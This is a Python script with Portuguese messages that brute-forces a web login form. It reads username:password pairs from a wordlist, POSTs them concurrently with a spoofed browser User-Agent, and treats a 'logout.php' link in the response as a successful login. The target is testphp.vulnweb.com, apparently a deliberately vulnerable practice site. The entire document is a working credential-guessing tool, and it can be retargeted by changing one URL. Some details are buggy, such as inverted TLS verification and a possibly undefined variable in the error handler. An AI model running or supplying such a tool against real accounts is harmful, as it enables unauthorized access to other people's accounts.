import requests
import time
import concurrent.futures
import os
from urllib.parse import urlparse

WORDLIST_FILE = 'Wordlist.txt'
LOGIN_URL = 'http://testphp.vulnweb.com/login.php'
EXPECTED_STATUS_CODE = 200

WAIT_TIME = 5
TIMEOUT = 5
MAX_WORKERS = 100
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'


def login(username, password, index):
    payload = {'username': username, 'password': password}
    headers = {'User-Agent': USER_AGENT, 'Connection': 'close'}
    try:
        with requests.Session() as session:
            session.verify = urlparse(LOGIN_URL).scheme == 'http'
            session.timeout = TIMEOUT
            response = session.post(LOGIN_URL, data=payload, headers=headers)
            cookies = session.cookies.get_dict()
            if response is not None and response.status_code == EXPECTED_STATUS_CODE and 'test%2Ftest' not in response.cookies and 'logout.php' in response.text:
                return (username, password)
            else:
                return None

    except requests.exceptions.RequestException as e:
        print(f'Erro de rede ao efetuar login com usuário {username} e senha {password} na linha {index}: {e}')
        if response is not None:
            print(response.text)
        return None


def get_wordlist(filename):
    if not os.path.exists(filename):
        print(f'O arquivo {filename} não existe')
        return
    try:
        with open(filename) as f:
            for index, line in enumerate(f):
                print(f'Carregando linha {index}: {line.strip()}')
                yield index, line.strip().split(':')
    except OSError as e:
        print(f'Erro ao abrir o arquivo {filename}: {e}')



if __name__ == '__main__':
    start_time = time.time()
    wordlist = list(get_wordlist(WORDLIST_FILE))
    if not wordlist:
        print('Não foi possível obter a lista de usuários e senhas')
        exit()
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for index, (username, password) in wordlist:
            futures.append(executor.submit(login, username, password, index))
            time.sleep(WAIT_TIME)
        done, _ = concurrent.futures.wait(futures)
        for future in done:
            if future.result() is not None:
                result = future.result()
                print(f'Senha correta encontrada: {result[1]} para o usuário {result[0]}')
                break
        else:
            print('Senha não encontrada na wordlist')
    end_time = time.time()
    print(f'Tempo total de execução: {end_time - start_time:.2f} segundos')
